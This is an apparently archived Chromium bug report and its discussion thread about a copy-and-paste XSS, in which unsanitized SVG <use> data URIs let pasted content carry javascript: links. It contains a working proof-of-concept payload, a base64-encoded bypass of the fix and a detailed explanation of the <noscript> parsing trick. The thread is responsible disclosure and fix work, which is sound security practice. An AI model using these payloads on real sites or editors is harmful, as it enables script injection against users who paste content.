# Security:  Another "universal" XSS via copy&paste

| Field | Value |
|-------|-------|
| **Issue ID** | [40051189](https://issues.chromium.org/issues/40051189) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink>Editing, Blink>SVG |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | mi...@bentkowski.info |
| **Assignee** | xi...@chromium.org |
| **Created** | 2020-01-10 |
| **Bounty** | $2,000.00 |

## Description

**VULNERABILITY DETAILS**  

It is possible to execute arbitrary JS code via copy&paste. The effect of this bug is exactly the same as in <https://crbug.com/chromium/1011950>.

**VERSION**  

Verified on:  

\* Canary: 81.0.4022.0  

\* Stable: 79.0.3945.88

**REPRODUCTION CASE**  

As in <https://crbug.com/chromium/1011950>, the scenario is that the victim needs to copy something from attacker's site and then paste it. I confirmed it works on Blogger.

PoC:

1. Go to <https://jsbin.com/mikejojomo/edit?html,output>
2. Press Copy.
3. Go to new post in Blogger
4. Paste the content
5. Click on the pasted text.
6. XSS fires!

Here's the relevant part of the exploit:

<div contenteditable=false>
<svg style="position:fixed;left:0;top:0;width:100%;height:100%">
<use href="data:application/xml,
<svg id='x' xmlns='http://www.w3.org/2000/svg'>
<a href='javascript:alert(document.domain)'>
<rect width='100%' height='100%' fill='lightblue' />
<text x='0' y='0' fill='black'>
<tspan x='0' dy='1.2em'>Oops, there's something wrong with the page!</tspan>
<tspan x='0' dy='1.2em'>Please click here to reload.</tspan>
</svg>#x">

It abuses <use> element within <svg> which basically includes another SVG style and inserts it into its shadow DOM. The imported SVG is not sanitized hence making it possible to add <a> tag with javascript: href.

The exploit requires user interaction and I couldn't find a way to make it user-interaction-free. I will still try to do that, though.

I'm also attaching videocast, proving XSS in Blogger.

**CREDIT INFORMATION**  

**Externally reported security bugs may appear in Chrome release notes. If**  

**this bug is included, how would you like to be credited?**  

Reporter credit: Michał Bentkowski of Securitum

## Attachments

- [copy-paste-xss.mp4](attachments/copy-paste-xss.mp4) (video/mp4, 650.2 KB)

## Timeline

### mi...@bentkowski.info (2020-01-10)

I feel that the report is pretty thin on details so let me clear it up a little bit:

* The XSS is not in Blogger itself; it's a bug in Chromium
* The issue is that the clipboard sanitizer of Chromium doesn't sanitize <use> element on pasting. In a nutshell, with <use> it's possible to embed another SVG file via data: URI. The SVG embedded via <use> is not sanitized at all, hence the javascript: scheme is not sanitized in the hyperlink.

I feel like the right way of fixing the issue is to disallow <use> element completely in pasted content, or just disallow it if it's referencing external URLs (including data:).

### mb...@chromium.org (2020-01-10)

xiaochengh: Could you please take a look at this or help find another owner?

[Monorail components: Blink>Editing Blink>SVG]

### xi...@chromium.org (2020-01-11)

+dcheng

We need some discussion on what exactly to block.

I don't think we can block <use> elements in general. Normal SVG can have <use> elements for normal rendering purposes, and we should be able to copy&paste it.

data: urls can also be used for legit purposes, possibly? Though I'm not sure how necessary that is.

Also according to discussions in https://crbug.com/chromium/1017846, it seems pretty hard to sanitize the content of a data: url, as it involves navigation, and there can be nested data: urls.

### sh...@chromium.org (2020-01-11)

Setting milestone and target because of Security_Impact=Stable and medium severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2020-01-11)

Setting Pri-1 to match security severity Medium. If this is incorrect, please reset the priority. Sheriffbot won't make this change again.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### xi...@chromium.org (2020-01-15)

inferno: Could you help triage/fix it? Thank you!

I don't really have a good idea to fix it, and don't want it to be blocked on me.

### sc...@chromium.org (2020-01-16)

[Empty comment from Monorail migration]

### fs...@opera.com (2020-01-16)

Given that the sanitizer has the layout - and thus the generated shadow tree for the <use>, it could conditionally drop <use> elements whose expanded shadow tree contains "scriptable attributes". Optionally we could disable javascript: navigations for <a> in <use>.

### sh...@chromium.org (2020-01-24)

inferno: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### in...@chromium.org (2020-02-12)

Removing owner, so next sheriff can triage it.

### aj...@google.com (2020-02-21)

inferno: please suggest a suitable owner so that this security bug receives appropriate attention.

### [Deleted User] (2020-02-22)

[Empty comment from Monorail migration]

### mi...@bentkowski.info (2020-02-26)

Adding my two cents here (and hoping that it would make processing this issue faster). I don't think it's that bad just to block <use> in clipboard sanitizer, considering that it's cannot be pasted on other browsers:
 - Firefox: always remove href attribute from <use> on pasting, no matter what its value is,
 - Safari: doesn't support data: URI in <use>; non-data URIs don't seem to be exploitable, considering that they need to be same-origin with the page which receives the paste event.


### [Deleted User] (2020-02-26)

inferno: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2020-02-27)

inferno: Uh oh! This issue still open and hasn't been updated in the last 15 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2020-02-28)

inferno: Uh oh! This issue still open and hasn't been updated in the last 16 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2020-02-29)

inferno: Uh oh! This issue still open and hasn't been updated in the last 17 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2020-03-01)

inferno: Uh oh! This issue still open and hasn't been updated in the last 18 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2020-03-02)

inferno: Uh oh! This issue still open and hasn't been updated in the last 19 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2020-03-03)

inferno: Uh oh! This issue still open and hasn't been updated in the last 20 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2020-03-04)

inferno: Uh oh! This issue still open and hasn't been updated in the last 21 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2020-03-05)

inferno: Uh oh! This issue still open and hasn't been updated in the last 22 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2020-03-06)

inferno: Uh oh! This issue still open and hasn't been updated in the last 23 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2020-03-07)

inferno: Uh oh! This issue still open and hasn't been updated in the last 24 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2020-03-08)

inferno: Uh oh! This issue still open and hasn't been updated in the last 25 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2020-03-09)

inferno: Uh oh! This issue still open and hasn't been updated in the last 26 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2020-03-10)

inferno: Uh oh! This issue still open and hasn't been updated in the last 27 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2020-03-11)

inferno: Uh oh! This issue still open and hasn't been updated in the last 28 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2020-03-12)

inferno: Uh oh! This issue still open and hasn't been updated in the last 29 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2020-03-13)

inferno: Uh oh! This issue still open and hasn't been updated in the last 30 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2020-03-14)

inferno: Uh oh! This issue still open and hasn't been updated in the last 31 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2020-03-15)

inferno: Uh oh! This issue still open and hasn't been updated in the last 32 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2020-03-16)

inferno: Uh oh! This issue still open and hasn't been updated in the last 33 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2020-03-17)

inferno: Uh oh! This issue still open and hasn't been updated in the last 34 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2020-03-18)

inferno: Uh oh! This issue still open and hasn't been updated in the last 35 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2020-03-19)

inferno: Uh oh! This issue still open and hasn't been updated in the last 36 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ma...@google.com (2020-03-19)

I'm going to unassign this bug so that it can get to the Editing triage rotation. It isn't getting attention this way.

### sc...@chromium.org (2020-03-24)

https://crbug.com/chromium/1040755#c13 is extremely helpful for deciding what to do about this, and https://crbug.com/chromium/1040755#c8 implies we can do it. xiaochengh@, do you think you can implement this and finally get this bug moving forward?

### [Deleted User] (2020-03-24)

xiaochengh: Uh oh! This issue still open and hasn't been updated in the last 68 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### xi...@chromium.org (2020-03-24)

Alright then, I'll strip data urls in <use>, given that it prevents the exploit and has the minimum functionality loss of all proposed/implemented approaches so far.

### xi...@chromium.org (2020-03-25)

In progress: https://chromium-review.googlesource.com/c/chromium/src/+/2119198

michal: Does the mathml injection trick you used in https://crbug.com/chromium/1011950 work here? I tried a bit but didn't succeed

### mi...@bentkowski.info (2020-03-25)

@xiaochengh: I also didn't succeed. In general it seems that we're quite limited on elements we can use in svg imported via <use>.

### bu...@chops-service-accounts.iam.gserviceaccount.com (2020-03-25)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/dfa9e425058e80816441e49161a7d0e4924e9d66

commit dfa9e425058e80816441e49161a7d0e4924e9d66
Author: Xiaocheng Hu <xiaochengh@chromium.org>
Date: Wed Mar 25 20:25:49 2020

Disallow pasting SVG use elements data URI

SVG use elements with data URI may carry arbitrary content. Hence, we
also sanitize it before pasting it into document.

Bug: 1040755
Change-Id: Iad8701174c7c0f13dc5affb9e011d645990ef754
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2119198
Commit-Queue: Xiaocheng Hu <xiaochengh@chromium.org>
Reviewed-by: Yoshifumi Inoue <yosin@chromium.org>
Cr-Commit-Position: refs/heads/master@{#753349}

[modify] https://crrev.com/dfa9e425058e80816441e49161a7d0e4924e9d66/third_party/blink/renderer/core/editing/serializers/serialization.cc
[add] https://crrev.com/dfa9e425058e80816441e49161a7d0e4924e9d66/third_party/blink/web_tests/editing/pasteboard/paste-svg-use.html


### xi...@chromium.org (2020-03-25)

Since M80 is in Stable for a while, with the same reasons given in https://crbug.com/chromium/1011950, I don't think we'll merge the fix to M80.

I think we should target M81 instead.

### xi...@chromium.org (2020-03-26)

Given that we won't have an M82 release any more, should I still merge it to M82 and then M81, or directly to M81?

### la...@google.com (2020-03-27)

xiaochengh@ - please check with M83 release manager as M82 is no longer available. Adding srinivassista@ who is M83 release TPM.

### [Deleted User] (2020-03-27)

Please mark security bugs as fixed as soon as the fix lands, and before requesting merges. This update is based on the merge- labels applied to this issue. Please reopen if this update was incorrect.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### xi...@chromium.org (2020-03-27)

[Empty comment from Monorail migration]

### sr...@google.com (2020-03-27)

+adetaylor@ to reveiw for M81 security merge.

### [Deleted User] (2020-03-27)

This bug requires manual review: We are only 10 days from stable.
Before a merge request will be considered, the following information is required to be added to this bug:

1. Does your merge fit within the Merge Decision Guidelines?
- Chrome: https://chromium.googlesource.com/chromium/src.git/+/master/docs/process/merge_request.md#when-to-request-a-merge
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. Links to the CLs you are requesting to merge.
3. Has the change landed and been verified on master/ToT?
4. Why are these changes required in this milestone after branch?
5. Is this a new feature?
6. If it is a new feature, is it behind a flag using finch?

Please contact the milestone owner if you have questions.
Owners: benmason@(Android), bindusuvarna@(iOS), geohsu@(ChromeOS), pbommana@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### xi...@chromium.org (2020-03-27)

1. Has test coverage and has been in Canary for 24h. I believe there's no real usage of pasting svg <use> elements with data urls, and other browsers don't support it either (see https://crbug.com/chromium/1040755#c13), so it should be safe.

2. https://chromium-review.googlesource.com/c/chromium/src/+/2119198

3. Yes

4. This is a long standing security issue that already exists in M81. It'll be great to ship M81 with the fix.

5. No

### ad...@chromium.org (2020-03-27)

Yes, please merge to M81, branch 4044.

### bu...@chops-service-accounts.iam.gserviceaccount.com (2020-03-28)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/ad3c3561266f6bf2dcf79d10ad47c8ecb4316930

commit ad3c3561266f6bf2dcf79d10ad47c8ecb4316930
Author: Xiaocheng Hu <xiaochengh@chromium.org>
Date: Sat Mar 28 01:07:10 2020

[M81 Merge] Disallow pasting SVG use elements data URI

SVG use elements with data URI may carry arbitrary content. Hence, we
also sanitize it before pasting it into document.

(cherry picked from commit dfa9e425058e80816441e49161a7d0e4924e9d66)

Bug: 1040755
Tbr: yosin@chromium.org
Change-Id: Iad8701174c7c0f13dc5affb9e011d645990ef754
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2119198
Commit-Queue: Xiaocheng Hu <xiaochengh@chromium.org>
Reviewed-by: Yoshifumi Inoue <yosin@chromium.org>
Cr-Original-Commit-Position: refs/heads/master@{#753349}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2125431
Reviewed-by: Xiaocheng Hu <xiaochengh@chromium.org>
Cr-Commit-Position: refs/branch-heads/4044@{#865}
Cr-Branched-From: a6d9daf149a473ceea37f629c41d4527bf2055bd-refs/heads/master@{#737173}

[modify] https://crrev.com/ad3c3561266f6bf2dcf79d10ad47c8ecb4316930/third_party/blink/renderer/core/editing/serializers/serialization.cc
[add] https://crrev.com/ad3c3561266f6bf2dcf79d10ad47c8ecb4316930/third_party/blink/web_tests/editing/pasteboard/paste-svg-use.html


### [Deleted User] (2020-03-28)

[Empty comment from Monorail migration]

### mi...@bentkowski.info (2020-03-29)

Hey, not sure if this should be reported as new bug but I've found a bypass to the fix. I feel kinda bad about it since the bypass was introduced by fix to other bug I reported (https://crbug.com/chromium/1017871) and it is really similar to bug I've reported to WebKit (https://trac.webkit.org/changeset/254800/webkit) so I feel I should've caught it earlier.

Here's the bypass:

    <noscript><u title="</noscript><div contenteditable=false>
    <svg style=position:fixed;left:0;top:0;width:100%;height:100%>
    <use href=data:application/xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJz4KPGEgaHJlZj0namF2YXNjcmlwdDphbGVydCgxMjMpJz4KICAgIDxyZWN0IHdpZHRoPScxMDAlJyBoZWlnaHQ9JzEwMCUnIGZpbGw9J2xpZ2h0Ymx1ZScgLz4KICAgICA8dGV4dCB4PScwJyB5PScwJyBmaWxsPSdibGFjayc+CiAgICAgICA8dHNwYW4geD0nMCcgZHk9JzEuMmVtJz5Pb3BzLCB0aGVyZSdzIHNvbWV0aGluZyB3cm9uZyB3aXRoIHRoZSBwYWdlITwvdHNwYW4+CiAgICAgPHRzcGFuIHg9JzAnIGR5PScxLjJlbSc+UGxlYXNlIGNsaWNrIGhlcmUgdG8gcmVsb2FkLjwvdHNwYW4+Cjwvc3ZnPg==#x>
    "></noscript>asdasd

And here's an explanation why it works:

I've reported https://crbug.com/chromium/1017871 which is about style injection via copy&paste. The bug was resolved by going the Safari way, ie. if there's a <style> element in the pasted content:
  a) a dummy document is created,
  b) style and layout is calculated in the dummy document,
  c) the document is re-serialized as the markup to be inserted.
  
This patch however introduced a subtle issue, which I missed. The document is parsed assuming that scripting is disabled. This impacts parsing of <noscript> element [1], which is parsed differently depending on scripting being disabled or enabled. In a nutshell, if scripting is enabled, <noscript>'s content model is a text; otherwise, it is a transparent element.

The difference can be proved with a simple example. Assume that we put the following HTML to the clipboard:

    a<noscript><u></noscript>b
    
After pasting, we get the following DOM tree:

    #text: "a"
    <NOSCRIPT>
        #text: "<u>"
    #text: "b"

This is expected, since with scripting enabled, <noscript> can contain only text. 

However, when we put the following HTML to the clipboard:

    <style></style>a<noscript><u></noscript>b
    
We'll get a different DOM tree after pasting:

    #text: "a"
    <NOSCRIPT>
        #text: <u></u>
    <U>
        #text: "b"
        
Inclusion of <style> element forced the dummy document to be created, and because it was parsed with scripting disabled, it created a new <u> element.

Moving forward (and closer to the final exploit), let's assume we have the following HTML in clipboard:

    <style></style>a<noscript><u title="</noscript>SOME_INJECTION_HERE"></noscript>b
    
In the dummy document, it creates the following DOM tree:

    #text: "a"
    <NOSCRIPT>
        <U title="</noscript>SOME_INJECTION_HERE"></U>
    <U title="</noscript>SOME_INJECTION_HERE">
        #text: "b"

However, when this document is re-serialized and inserted after pasting, it is parsed differently because the scripting is now enabled, producing the following DOM tree:

    #text: "a"
    <NOSCRIPT>
        #text: "<u title=""
    #text: "SOME_INJECTION_HERE">"
    <U title="</noscript>SOME_INJECTION_HERE">
        #text: "b"

Now the string "SOME_INJECTION_HERE" escapes the title attribute because <noscript> is closed by the </noscript> that immediately precedes the string. The same behaviour was exploited by Masato Kinugawa in his famous XSS in Google Search [2]. So in my bypass, I've just substituted "SOME_INJECTION_HERE" with the same <svg> and <use> trick I've shown in this issue.

I hope the explanation is clear, please let me know if I'm wrong.

[1]: https://html.spec.whatwg.org/multipage/scripting.html#the-noscript-element
[2]: https://www.youtube.com/watch?v=lG7U3fuNw3A

### ad...@chromium.org (2020-03-30)

Thanks. I've moved that new report into https://crbug.com/chromium/1065761. Let's keep the current issue marked as Fixed or all the merge processes will get confused.

### na...@google.com (2020-03-30)

[Empty comment from Monorail migration]

### na...@google.com (2020-04-01)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### na...@google.com (2020-04-01)

Congrats! The Panel decided to award $2,000 for this report. 

### na...@google.com (2020-04-01)

[Empty comment from Monorail migration]

### ad...@google.com (2020-04-04)

[Empty comment from Monorail migration]

### ad...@chromium.org (2020-04-04)

[Empty comment from Monorail migration]

### ad...@google.com (2020-04-04)

[Empty comment from Monorail migration]

### ad...@chromium.org (2020-04-14)

[Empty comment from Monorail migration]

### [Deleted User] (2020-07-03)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mi...@bentkowski.info (2020-07-06)

Why does this bug have the label Restrict-View-SecurityEmbargo? Could you make it public?

### ad...@chromium.org (2020-07-07)

I think because of the WebKit bug mentioned in https://crbug.com/chromium/1040755#c55, just out of caution. As that relates to a change from 6 months ago, I'll open this up now.

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-08)

This issue was migrated from crbug.com/chromium/1040755?no_tracker_redirect=1

[Auto-CCs applied]
[Multiple monorail components: Blink>Editing, Blink>SVG]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40051189)*
